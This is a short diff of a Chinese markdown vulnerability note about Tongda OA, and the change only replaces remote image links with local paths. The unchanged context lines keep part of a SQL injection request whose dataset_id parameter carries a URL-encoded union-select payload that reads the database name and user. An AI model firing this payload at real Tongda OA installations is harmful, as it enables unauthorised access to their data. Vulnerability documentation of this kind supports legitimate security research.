@@ -20,7 +20,7 @@ app="TDXK-通达OA"
 
 登陆页面
 
-![image-20220520154236968](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201542062.png)
+![image-20220520154236968](./images/202205201542062.png)
 
 发送请求包执行SQL语句
 
@@ -35,4 +35,4 @@ Accept-Encoding: gzip
 _POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
 ```
 
-![image-20220520154246274](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201542313.png)
+![image-20220520154246274](./images/202205201542313.png)
